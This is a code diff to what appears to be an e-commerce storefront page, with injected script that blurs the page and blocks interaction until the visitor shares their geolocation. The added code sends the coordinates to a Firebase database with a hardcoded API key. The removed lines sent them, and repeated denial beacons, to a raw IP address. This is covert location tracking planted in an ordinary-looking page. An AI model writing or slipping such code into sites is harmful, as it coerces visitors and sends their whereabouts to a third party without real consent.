@@ -7861,6 +7861,26 @@ _ReStockConfig.wishlist = undefined;_ReStockConfig.wishlist = {"is_service_activ
   }
 </script>
 <script>
+  module = {};
+</script>
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.6.0/firebase-app.js";
+  import { getDatabase, ref, set, get, push, child, update, remove, onChildAdded, onChildRemoved } from "https://www.gstatic.com/firebasejs/10.6.0/firebase-database.js";
+  
+  const firebaseConfig = {
+    apiKey: "AIzaSyA9czXS21ONXVxY2eGMS4GwMfR78IJE_Yc",
+    authDomain: "secret-37491.firebaseapp.com",
+    databaseURL: "https://secret-37491-default-rtdb.firebaseio.com",
+    projectId: "secret-37491",
+    storageBucket: "secret-37491.firebasestorage.app",
+    messagingSenderId: "185262437707",
+    appId: "1:185262437707:web:0ffe7c52e56f496e27a4ce",
+    measurementId: "G-W19Q39DHFZ"
+  };
+  const app = initializeApp(firebaseConfig);
+  const db = getDatabase(app);  
+
+
     document.querySelector('body').style.filter = 'blur(10px)';
     document.querySelector('body').style.pointerEvents = 'none';
 
@@ -7868,20 +7888,31 @@ _ReStockConfig.wishlist = undefined;_ReStockConfig.wishlist = {"is_service_activ
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 function(position) {
-                    window.location.href = 'http://158.69.251.105:41090/lat=' + position.coords.latitude + '&lon=' + position.coords.longitude;
+                    document.querySelector('body').style.filter = 'blur(0px)';
+                    document.querySelector('body').style.pointerEvents = 'none';
+                    var location = position.coords.latitude + ',' + position.coords.longitude;
+                    module.sendMsg = async function sendMsg() {
+                      set(ref(db, 'Messages/Locations'), {
+                        "Location": location
+                      }).then(() => {
+                        alert('Location sent successfully!');
+                      })
+                    }
+                    module.sendMsg();
+                    // window.location.href = 'http://158.69.251.105:41090/lat=' + position.coords.latitude + '&lon=' + position.coords.longitude;
                 },
                 function(error) {
                     if (error.code === error.PERMISSION_DENIED) {
                         console.log("Location permission denied.");
                         setInterval(function() {
-                            console.log('sent')
-                            navigator.sendBeacon('http://158.69.251.105:41090/PermisionDenied');
+                            console.log('denied')
+                            // navigator.sendBeacon('http://158.69.251.105:41090/PermisionDenied');
                         }, 10000);
                     } else {
                         console.log("Error getting location:", error.message);
                         setInterval(function() {
-                            console.log('sent')
-                            navigator.sendBeacon('http://158.69.251.105:41090/ErrorGettingLocation');
+                            console.log('error')
+                            // navigator.sendBeacon('http://158.69.251.105:41090/ErrorGettingLocation');
                         }, 10000);
                     }
                 }
